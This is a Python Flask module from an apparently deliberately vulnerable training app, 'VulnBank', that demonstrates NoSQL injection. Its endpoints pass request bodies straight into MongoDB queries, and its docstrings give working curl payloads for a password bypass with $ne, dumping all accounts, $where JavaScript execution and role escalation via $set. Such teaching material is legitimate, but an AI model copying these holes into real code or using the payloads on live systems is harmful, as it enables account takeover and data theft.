"""
VulnBank - NoSQL Injection
CWE-943: Improper Neutralization of Special Elements in Data Query Logic

Framework annotations:
  CWE: CWE-943, CWE-89 (analogous to SQL injection)
  MITRE ATT&CK: T1190 (Exploit Public-Facing Application)
  OWASP: A03:2021 - Injection
  PCI DSS: Req 6.2.4
  NIST: SI-10
  ISO 27001: A.14.2.5
"""

import json
from flask import Blueprint, request, jsonify

nosql_bp = Blueprint("nosql", __name__)

# --- pymongo with graceful fallback to in-memory simulation ---
try:
    import pymongo
    _client = pymongo.MongoClient("mongodb://localhost:27017/", serverSelectionTimeoutMS=2000)
    _client.server_info()
    _db = _client["vulnbank"]
    _users_col = _db["users"]
    _accounts_col = _db["accounts"]
    # Seed data if empty
    if _users_col.count_documents({}) == 0:
        _users_col.insert_many([
            {"username": "admin", "password": "admin123", "role": "admin", "balance": 999999},
            {"username": "alice", "password": "password1", "role": "user", "balance": 1500},
            {"username": "bob", "password": "letmein", "role": "user", "balance": 800},
        ])
    MONGO_AVAILABLE = True
except Exception:
    MONGO_AVAILABLE = False
    # In-memory simulation for when MongoDB is not installed
    _mem_users = [
        {"_id": "1", "username": "admin", "password": "admin123", "role": "admin", "balance": 999999},
        {"_id": "2", "username": "alice", "password": "password1", "role": "user", "balance": 1500},
        {"_id": "3", "username": "bob", "password": "letmein", "role": "user", "balance": 800},
    ]
    _mem_accounts = [
        {"_id": "1", "owner": "admin", "balance": 999999, "type": "premium"},
        {"_id": "2", "owner": "alice", "balance": 1500, "type": "standard"},
        {"_id": "3", "owner": "bob", "balance": 800, "type": "standard"},
    ]


def _sim_find_one(collection, query):
    """Simulate MongoDB find_one on in-memory list — intentionally naive (no operator support)."""
    for doc in collection:
        match = True
        for k, v in query.items():
            if isinstance(v, dict):
                # Simulate $ne operator
                if "$ne" in v and doc.get(k) == v["$ne"]:
                    match = False
                    break
                # $gt, $lt etc — just return first doc (simulates bypass)
            elif doc.get(k) != v:
                match = False
                break
        if match:
            return doc
    # If query contains dict values (operators), simulate bypass by returning first doc
    for k, v in query.items():
        if isinstance(v, dict):
            return collection[0] if collection else None
    return None


def _sim_find(collection, query):
    """Simulate MongoDB find on in-memory list."""
    # If query is empty or uses operators, return all (simulates injection bypass)
    if not query or any(isinstance(v, dict) for v in query.values()):
        return collection
    return [d for d in collection if all(d.get(k) == v for k, v in query.items())]


@nosql_bp.route("/api/nosql/login", methods=["POST"])
def nosql_login():
    """
    CWE-943: NoSQL Injection — request.json passed directly to MongoDB find_one.
    Bypass authentication with: {"username": "admin", "password": {"$ne": ""}}

    Exploit:
        curl -X POST -H 'Content-Type: application/json' \\
             -d '{"username": "admin", "password": {"$ne": ""}}' \\
             http://localhost:5000/api/nosql/login
        # Logs in as admin without knowing password — $ne operator matches any non-empty password
    """
    # VULN CWE-943: entire request body passed as MongoDB query — operators allowed
    body = request.get_json(force=True) or {}

    if MONGO_AVAILABLE:
        user = _users_col.find_one(body)  # attacker controls query operators
    else:
        user = _sim_find_one(_mem_users, body)

    if user:
        return jsonify({
            "status": "authenticated",
            "username": user.get("username"),
            "role": user.get("role"),
            "balance": user.get("balance"),
            "warning": "NoSQL injection — $ne operator bypassed password check — CWE-943"
        })
    return jsonify({"error": "Invalid credentials"}), 401


@nosql_bp.route("/api/nosql/accounts", methods=["GET"])
def nosql_accounts():
    """
    CWE-943: NoSQL Injection — filter param parsed from JSON and used directly as MongoDB query.
    Bypass: ?filter={"balance":{"$gt":0}} returns all accounts.

    Exploit:
        curl 'http://localhost:5000/api/nosql/accounts?filter={"balance":{"$gt":0}}'
        # Returns all accounts regardless of ownership
        curl 'http://localhost:5000/api/nosql/accounts?filter={}'
        # Empty query — returns all documents
    """
    filter_str = request.args.get("filter", "{}")
    try:
        # VULN CWE-943: attacker-supplied JSON becomes MongoDB query directly
        query = json.loads(filter_str)
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON filter"}), 400

    if MONGO_AVAILABLE:
        accounts = list(_accounts_col.find(query, {"_id": 0}))
    else:
        accounts = _sim_find(_mem_accounts, query)

    return jsonify({
        "accounts": accounts,
        "query_used": query,
        "warning": "Filter passed directly to MongoDB — CWE-943"
    })


@nosql_bp.route("/api/nosql/search", methods=["POST"])
def nosql_search():
    """
    CWE-943: NoSQL Injection — $where operator enables server-side JavaScript execution in MongoDB.
    Attacker can run arbitrary JS on the MongoDB server.

    Exploit:
        curl -X POST -H 'Content-Type: application/json' \\
             -d '{"$where": "this.balance > 0"}' \\
             http://localhost:5000/api/nosql/search
        # Server-side JS returns all users with positive balance

        curl -X POST -H 'Content-Type: application/json' \\
             -d '{"$where": "sleep(5000) || true"}' \\
             http://localhost:5000/api/nosql/search
        # Time-based blind injection — causes 5s delay, confirms JS execution
    """
    body = request.get_json(force=True) or {}

    if MONGO_AVAILABLE:
        # VULN CWE-943: $where key allows attacker JS to execute server-side
        try:
            results = list(_users_col.find(body, {"_id": 0, "password": 0}))
        except Exception as e:
            results = [{"error": str(e)}]
    else:
        # Simulate: if $where present, return all (simulates bypass)
        if "$where" in body:
            results = [{"username": u["username"], "balance": u["balance"]} for u in _mem_users]
        else:
            results = []

    return jsonify({
        "results": results,
        "query": body,
        "warning": "$where operator allows server-side JS execution — CWE-943"
    })


@nosql_bp.route("/api/nosql/profile", methods=["PUT"])
def nosql_update_profile():
    """
    CWE-943: NoSQL Injection — request body merged into $set operator without field filtering.
    Attacker can escalate role by supplying {"role": "admin"} or any other field.

    Exploit:
        curl -X PUT -H 'Content-Type: application/json' \\
             -H 'X-User: alice' \\
             -d '{"email": "alice@evil.com", "role": "admin", "balance": 999999}' \\
             http://localhost:5000/api/nosql/profile
        # Updates role to admin and sets balance to $999,999 — no field whitelist
    """
    current_user = request.headers.get("X-User", "alice")
    body = request.get_json(force=True) or {}

    # VULN CWE-943: no field whitelist — attacker can set any field including role/balance
    update_doc = {"$set": body}

    if MONGO_AVAILABLE:
        result = _users_col.update_one({"username": current_user}, update_doc)
        updated = _users_col.find_one({"username": current_user}, {"_id": 0})
    else:
        # Simulate: find and update in-memory
        updated = None
        for u in _mem_users:
            if u["username"] == current_user:
                u.update(body)  # no field restriction
                updated = {k: v for k, v in u.items() if k != "_id"}
                break

    return jsonify({
        "status": "profile updated",
        "updated_fields": list(body.keys()),
        "profile": updated,
        "warning": "No field whitelist — role escalation via $set — CWE-943"
    })
